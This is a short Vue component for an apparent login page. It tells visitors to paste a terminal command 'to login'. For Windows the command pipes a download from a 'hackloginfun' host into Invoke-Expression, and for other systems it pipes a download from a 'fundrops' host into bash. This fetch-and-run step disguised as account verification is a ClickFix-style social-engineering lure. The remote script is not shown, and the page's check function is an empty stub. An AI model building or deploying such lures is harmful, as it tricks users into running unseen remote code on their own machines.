<script lang="ts" setup>
const isWindows = ref(false);
onMounted(() => {
    if (navigator.userAgent.includes("Windows")) {
        isWindows.value = true;
    }
});
const checkIfUserIsDone = async () => {};
</script>
<template>
    <div class="flex flex-col">
        <span
            >Copy and paste this to your terminal of your choice to login</span
        >
        <br />
        <code v-if="isWindows">
            Invoke-WebRequest
            https://hackloginfun.yuanhau.com/download/account-verify |
            Invoke-Expression --client=codecodecode
        </code>
        <code v-else>
            curl -s https://fundrops.yuanhau.com/download/account-verify | bash
            -s -- --client=codecodecode
        </code>
        <button>Check request</button>
    </div>
</template>
